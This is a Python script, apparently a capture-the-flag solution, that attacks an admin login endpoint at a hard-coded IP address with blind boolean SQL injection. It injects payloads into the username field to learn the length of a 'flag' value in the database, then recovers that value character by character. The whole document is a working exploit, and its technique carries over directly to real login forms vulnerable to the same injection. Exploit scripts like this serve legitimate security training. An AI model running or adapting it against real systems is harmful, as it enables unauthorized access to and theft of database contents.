import urllib.request
import urllib.parse

url = 'http://160.202.254.160:19353/admin/login'

def test(payload):
    data = urllib.parse.urlencode({'username': payload, 'password': '123456'}).encode()
    req = urllib.request.Request(url, data=data)
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        return resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.read().decode()
    except:
        return 'ERROR'

# Test: flag column and length
for l in range(1, 80):
    payload = "test' AND (SELECT LENGTH(flag) FROM flag)=" + str(l) + " AND '1'='1"
    r = test(payload)
    if 'Redirecting' in r:
        print(f'Flag length = {l}')
        break
else:
    print('Could not determine length, trying extraction anyway...')

# Try to extract with binary search for speed
import string
charset = string.ascii_lowercase + string.digits + string.ascii_uppercase + "{}_-!@#$%^&*"

flag = ""
for pos in range(1, 60):
    found = False
    for c in charset:
        payload = "test' AND SUBSTRING((SELECT flag FROM flag)," + str(pos) + ",1)='" + c + "' AND '1'='1"
        r = test(payload)
        if 'Redirecting' in r:
            flag += c
            print(f'[{pos}] {c} => {flag}')
            found = True
            break
    if not found:
        print(f'[{pos}] ? => {flag}')
        # If we've found some chars and now can't find more, maybe we're done
        if len(flag) > 5 and flag.startswith("flag{"):
            break

print(f'\nFinal flag: {flag}')
